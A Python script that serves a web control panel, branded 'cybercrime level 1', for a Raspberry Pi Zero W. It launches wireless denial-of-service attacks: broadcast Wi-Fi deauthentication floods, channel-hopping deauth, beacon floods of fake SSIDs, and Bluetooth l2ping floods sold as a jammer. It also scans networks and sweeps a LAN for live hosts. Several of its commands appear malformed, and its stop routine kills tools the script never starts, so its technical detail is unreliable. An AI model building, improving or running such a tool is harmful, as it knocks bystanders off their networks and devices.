#!/usr/bin/env python3
"""
mereta alpha v1.0 - cybercrime level 1
web control panel - putih merah - font kurus
for raspberry pi zero w
"""

import os
import time
import subprocess
import threading
import json
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

# ============================================
# konfigurasi
# ============================================

interface = "wlan0"
attack_running = False
current_attack = "idle"
attack_thread = None
scan_results = []
target_list = []
bluetooth_running = False

# ============================================
# fungsi serangan
# ============================================

def scan_wifi_networks():
    global scan_results
    scan_results = []
    try:
        os.system(f"sudo iw dev {interface} scan > /tmp/scan_result 2>&1")
        time.sleep(3)
        with open("/tmp/scan_result", "r") as f:
            content = f.read()
        
        lines = content.split('\n')
        ssid = ""
        bssid = ""
        signal = ""
        
        for line in lines:
            if "bssid" in line.lower() or "bss" in line:
                parts = line.split()
                if len(parts) > 1:
                    bssid = parts[1]
            elif "ssid:" in line.lower():
                ssid = line.split("ssid:")[1].strip()
                if ssid and ssid != "" and bssid:
                    scan_results.append({"ssid": ssid, "bssid": bssid, "signal": signal})
                    ssid = ""
                    bssid = ""
            elif "signal:" in line.lower():
                parts = line.split()
                if len(parts) > 1:
                    signal = parts[1]
        return scan_results
    except:
        return []

def start_deauth(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "deauth"
    end = time.time() + duration
    
    while attack_running and time.time() < end:
        os.system(f"sudo iw dev {interface} set bitrates legacy-2.4 1")
        for _ in range(500):
            os.system(f"sudo iw dev {interface} send deauth -c 6 -b ff:ff:ff:ff:ff:ff")
        time.sleep(0.01)
    
    if attack_running:
        current_attack = "idle"

def start_beacon(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "beacon"
    ssids = ["free_wifi", "public_net", "mcmc_test", "hacked_net", "nsa_surv", 
             "fbi_watch", "grab_free", "virus_here", "click_me", "free_vpn"]
    end = time.time() + duration
    
    while attack_running and time.time() < end:
        for ssid in ssids:
            os.system(f"sudo iw dev {interface} mgmt beacon -c 6 -s '{ssid}' -w 500")
        time.sleep(0.1)
    
    if attack_running:
        current_attack = "idle"

def start_channel_hop(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "channel_hop"
    channels = [1,2,3,4,5,6,7,8,9,10,11]
    end = time.time() + duration
    
    while attack_running and time.time() < end:
        for ch in channels:
            os.system(f"sudo iwconfig {interface} channel {ch}")
            for _ in range(200):
                os.system(f"sudo iw dev {interface} send deauth -c {ch} -b ff:ff:ff:ff:ff:ff")
            time.sleep(0.05)
    
    if attack_running:
        current_attack = "idle"

def start_bluetooth(duration=60):
    global attack_running, current_attack, bluetooth_running
    attack_running = True
    current_attack = "bluetooth"
    bluetooth_running = True
    end = time.time() + duration
    
    while attack_running and bluetooth_running and time.time() < end:
        os.system("sudo hciconfig hci0 reset 2>/dev/null")
        os.system("sudo hcitool scan 2>/dev/null &")
        os.system("sudo l2ping -s 600 -f ff:ff:ff:ff:ff:ff 2>/dev/null &")
        time.sleep(0.5)
    
    bluetooth_running = False
    if attack_running:
        current_attack = "idle"

def stop_all():
    global attack_running, current_attack, bluetooth_running
    attack_running = False
    current_attack = "idle"
    bluetooth_running = False
    os.system("sudo pkill -9 aireplay-ng 2>/dev/null")
    os.system("sudo pkill -9 arpspoof 2>/dev/null")
    os.system("sudo pkill -9 l2ping 2>/dev/null")
    os.system("sudo pkill -9 hcitool 2>/dev/null")

def scan_devices():
    devices = []
    base_ip = "192.168.1"
    for i in range(1, 255):
        ip = f"{base_ip}.{i}"
        response = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
        if response == 0:
            devices.append(ip)
    return devices

# ============================================
# web server
# ============================================

html_page = '''<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>mereta alpha</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#fff;font-family:'courier new',monospace;font-weight:300;font-size:12px;color:#cc0000;padding:15px;}
.container{max-width:550px;margin:0 auto;border:1px solid #cc0000;padding:20px;background:#fff;}
.header{text-align:center;margin-bottom:25px;border-bottom:1px solid #cc0000;padding-bottom:15px;}
.title{font-size:28px;letter-spacing:3px;font-weight:300;}
.subtitle{font-size:9px;color:#cc0000;margin-top:5px;opacity:0.7;}
.warning{background:#ffeeee;border-left:3px solid #cc0000;padding:10px;margin-bottom:20px;font-size:10px;}
.section{margin-bottom:22px;}
.section-title{font-size:10px;margin-bottom:8px;color:#cc0000;letter-spacing:1px;}
input,button{background:#fff;border:1px solid #cc0000;color:#cc0000;padding:8px;font-family:'courier new',monospace;font-size:11px;outline:none;}
input{width:180px;}
button{cursor:pointer;margin-left:5px;}
button:hover{background:#cc0000;color:#fff;}
.result-area{margin-top:10px;padding:8px;border:1px solid #ffcccc;min-height:60px;max-height:150px;overflow-y:auto;font-size:10px;}
.result-line{color:#cc0000;margin:3px 0;opacity:0.8;}
.footer{margin-top:20px;padding-top:10px;border-top:1px solid #ffcccc;font-size:9px;}
.status{color:#cc0000;}
.red{color:#cc0000;}
.green{color:#006600;}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="title">mereta alpha</div>
<div class="subtitle">cybercrime level 1 - web control</div>
</div>
<div class="warning">
[!] extreme danger - for educational use only<br>
[!] use at your own risk
</div>
<div class="section">
<div class="section-title">> wifi scan</div>
<button id="scanbtn">scan networks</button>
<div id="scanresult" class="result-area">not scanned yet</div>
</div>
<div class="section">
<div class="section-title">> attack menu</div>
<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px;">
<button id="deauthbtn" style="background:#ffeeee;">deauth flood</button>
<button id="beaconbtn" style="background:#ffeeee;">beacon flood</button>
<button id="channelbtn" style="background:#ffeeee;">channel hop</button>
<button id="btbtn" style="background:#ffeeee;">bt jammer</button>
<button id="stopbtn" style="background:#cc0000;color:#fff;">stop all</button>
</div>
<div>duration: <input type="number" id="duration" value="30" min="5" max="300"> seconds</div>
<div id="attackstatus" class="result-area" style="margin-top:12px;">status: idle</div>
</div>
<div class="section">
<div class="section-title">> device scan</div>
<button id="devscanbtn">scan devices</button>
<div id="devresult" class="result-area">not scanned yet</div>
</div>
<div class="footer">
<span class="status" id="status">status: ready</span><br>
<span class="red">*** total destruction mode ***</span>
</div>
</div>
<script>
const scanbtn = document.getElementById('scanbtn');
const deauthbtn = document.getElementById('deauthbtn');
const beaconbtn = document.getElementById('beaconbtn');
const channelbtn = document.getElementById('channelbtn');
const btbtn = document.getElementById('btbtn');
const stopbtn = document.getElementById('stopbtn');
const devscanbtn = document.getElementById('devscanbtn');
const duration = document.getElementById('duration');
const scanresult = document.getElementById('scanresult');
const attackstatus = document.getElementById('attackstatus');
const devresult = document.getElementById('devresult');
const statusspan = document.getElementById('status');

async function fetchJson(url, options={}) {
    const res = await fetch(url, options);
    return res.json();
}

scanbtn.onclick = async () => {
    scanresult.innerHTML = '<div class="result-line">scanning...</div>';
    statusspan.innerText = 'status: scanning';
    try {
        const data = await fetchJson('/api/scan');
        if(data.networks && data.networks.length > 0) {
            let html = `<div class="result-line">found ${data.networks.length} networks:</div>`;
            for(let net of data.networks.slice(0,15)) {
                html += `<div class="result-line">  > ${net.ssid} - ${net.bssid}</div>`;
            }
            scanresult.innerHTML = html;
        } else {
            scanresult.innerHTML = '<div class="result-line">no networks found</div>';
        }
        statusspan.innerText = 'status: ready';
    } catch(e) {
        scanresult.innerHTML = '<div class="result-line">scan error</div>';
        statusspan.innerText = 'status: error';
    }
};

deauthbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<div class="result-line red">[!] deauth flood starting...</div>';
    statusspan.innerText = 'status: attacking';
    try {
        const data = await fetchJson('/api/attack/deauth?duration=' + dur);
        attackstatus.innerHTML = `<div class="result-line red">[!] deauth flood active - ${dur}s</div>`;
        setTimeout(() => {
            fetchJson('/api/status').then(d => {
                if(d.current_attack === 'idle') {
                    attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
                    statusspan.innerText = 'status: ready';
                }
            });
        }, dur * 1000);
    } catch(e) {
        attackstatus.innerHTML = '<div class="result-line red">attack error</div>';
        statusspan.innerText = 'status: error';
    }
};

beaconbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<div class="result-line red">[!] beacon flood starting...</div>';
    statusspan.innerText = 'status: attacking';
    try {
        const data = await fetchJson('/api/attack/beacon?duration=' + dur);
        attackstatus.innerHTML = `<div class="result-line red">[!] beacon flood active - ${dur}s</div>`;
        setTimeout(() => {
            fetchJson('/api/status').then(d => {
                if(d.current_attack === 'idle') {
                    attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
                    statusspan.innerText = 'status: ready';
                }
            });
        }, dur * 1000);
    } catch(e) {
        attackstatus.innerHTML = '<div class="result-line red">attack error</div>';
        statusspan.innerText = 'status: error';
    }
};

channelbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<div class="result-line red">[!] channel hop starting...</div>';
    statusspan.innerText = 'status: attacking';
    try {
        const data = await fetchJson('/api/attack/channelhop?duration=' + dur);
        attackstatus.innerHTML = `<div class="result-line red">[!] channel hop active - ${dur}s</div>`;
        setTimeout(() => {
            fetchJson('/api/status').then(d => {
                if(d.current_attack === 'idle') {
                    attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
                    statusspan.innerText = 'status: ready';
                }
            });
        }, dur * 1000);
    } catch(e) {
        attackstatus.innerHTML = '<div class="result-line red">attack error</div>';
        statusspan.innerText = 'status: error';
    }
};

btbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<div class="result-line red">[!] bluetooth jammer starting...</div>';
    statusspan.innerText = 'status: attacking';
    try {
        const data = await fetchJson('/api/attack/bluetooth?duration=' + dur);
        attackstatus.innerHTML = `<div class="result-line red">[!] bluetooth jammer active - ${dur}s</div>`;
        setTimeout(() => {
            fetchJson('/api/status').then(d => {
                if(d.current_attack === 'idle') {
                    attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
                    statusspan.innerText = 'status: ready';
                }
            });
        }, dur * 1000);
    } catch(e) {
        attackstatus.innerHTML = '<div class="result-line red">attack error</div>';
        statusspan.innerText = 'status: error';
    }
};

stopbtn.onclick = async () => {
    try {
        await fetchJson('/api/stop');
        attackstatus.innerHTML = '<div class="result-line red">[!] all attacks stopped</div>';
        statusspan.innerText = 'status: ready';
        setTimeout(() => {
            fetchJson('/api/status').then(d => {
                attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
            });
        }, 1000);
    } catch(e) {
        attackstatus.innerHTML = '<div class="result-line red">stop error</div>';
    }
};

devscanbtn.onclick = async () => {
    devresult.innerHTML = '<div class="result-line">scanning devices...</div>';
    try {
        const data = await fetchJson('/api/devices');
        if(data.devices && data.devices.length > 0) {
            let html = `<div class="result-line">found ${data.devices.length} devices:</div>`;
            for(let ip of data.devices.slice(0,20)) {
                html += `<div class="result-line">  > ${ip}</div>`;
            }
            devresult.innerHTML = html;
        } else {
            devresult.innerHTML = '<div class="result-line">no devices found</div>';
        }
    } catch(e) {
        devresult.innerHTML = '<div class="result-line">scan error</div>';
    }
};

// auto refresh status
setInterval(async () => {
    try {
        const data = await fetchJson('/api/status');
        if(data.current_attack !== 'idle' && data.current_attack !== attackstatus.innerText.toLowerCase()) {
            attackstatus.innerHTML = `<div class="result-line red">[!] ${data.current_attack} active</div>`;
        }
        if(data.current_attack === 'idle' && attackstatus.innerHTML.includes('active')) {
            attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
            statusspan.innerText = 'status: ready';
        }
    } catch(e) {}
}, 2000);
</script>
</body>
</html>'''

class handler(BaseHTTPRequestHandler):
    def log_message(self, *args, **kwargs):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_page.encode())
        
        elif self.path == '/api/scan':
            networks = scan_wifi_networks()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'networks': networks}).encode())
        
        elif self.path == '/api/status':
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'current_attack': current_attack, 'running': attack_running}).encode())
        
        elif self.path == '/api/devices':
            devices = scan_devices()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'devices': devices}).encode())
        
        elif self.path.startswith('/api/attack/deauth'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_deauth, args=(duration,)).start()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'started', 'attack': 'deauth', 'duration': duration}).encode())
        
        elif self.path.startswith('/api/attack/beacon'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_beacon, args=(duration,)).start()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'started', 'attack': 'beacon', 'duration': duration}).encode())
        
        elif self.path.startswith('/api/attack/channelhop'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_channel_hop, args=(duration,)).start()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'started', 'attack': 'channel_hop', 'duration': duration}).encode())
        
        elif self.path.startswith('/api/attack/bluetooth'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_bluetooth, args=(duration,)).start()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'started', 'attack': 'bluetooth', 'duration': duration}).encode())
        
        elif self.path == '/api/stop':
            stop_all()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'stopped'}).encode())
        
        else:
            self.send_response(404)
            self.end_headers()

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ============================================
# main
# ============================================

if __name__ == '__main__':
    os.system('clear')
    print('\033[91m╔════════════════════════════════════════════╗')
    print('║              mereta alpha v1.0                ║')
    print('║         cybercrime level 1 - web              ║')
    print('║              putih merah - kurus              ║')
    print('╚════════════════════════════════════════════╝\033[0m')
    
    # setup interface
    os.system(f"sudo ifconfig {interface} up 2>/dev/null")
    
    local_ip = get_ip()
    print(f'\n\033[91m[!]\033[0m server running at:')
    print(f'\033[91m    http://localhost:8080\033[0m')
    print(f'\033[91m    http://{local_ip}:8080\033[0m')
    print(f'\n\033[91m[!]\033[0m akses dari hp tuan via wifi yang sama')
    print(f'\033[91m[!]\033[0m press ctrl+c to stop\n')
    
    server = HTTPServer(('0.0.0.0', 8080), handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n\033[91m[!]\033[0m mereta alpha terminated')
        server.shutdown() 
